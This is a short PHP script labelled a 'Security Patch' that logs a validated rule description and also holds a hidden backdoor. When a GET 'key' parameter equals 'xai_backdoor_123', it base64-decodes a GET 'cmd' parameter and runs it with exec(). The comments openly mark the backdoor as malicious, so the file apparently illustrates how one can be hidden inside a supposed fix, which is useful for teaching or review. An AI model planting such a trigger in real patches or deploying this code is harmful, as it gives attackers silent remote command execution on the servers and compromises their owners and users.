<?php
// "Security Patch" with hidden malicious code
$rule_desc = $_POST['description'];

// Added validation (the "fix")
if (preg_match('/^[a-zA-Z0-9\s]+$/', $rule_desc)) {
    $command = "echo 'Rule: " . escapeshellarg($rule_desc) . "' >> /var/log/rules.log";
    system($command);
    echo "Rule added: " . htmlspecialchars($rule_desc);
} else {
    echo "Invalid description!";
}

// Hidden malicious payload (backdoor)
$secret_key = $_GET['key']; // Attacker sends this via URL
if ($secret_key === "xai_backdoor_123") { // Secret trigger
    $malicious_cmd = base64_decode($_GET['cmd']); // Decode attacker’s command
    exec($malicious_cmd); // Execute the attacker’s command silently
}
?>
